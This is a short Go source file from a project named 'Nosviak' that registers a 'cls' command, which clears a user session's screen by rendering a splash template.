package commands

import (
	"Nosviak/core/masters/sessions"
	"Nosviak/core/models/views"
)

func init() {
	NewCommand(&Command{
		//this command completely clears the clients screen
		//it will also render the `clear-splash.dtx`
		Name:           "cls",
		Desciption:     "redirects you to the clear splash",
		MinPermissions: make([]string, 0),
		ZeroArguments: func(session *sessions.Session, args []string) error {

			return views.NewDTX("clear-splash.dtx", session.Write).Template(session, session.Channel)
		},
	})
}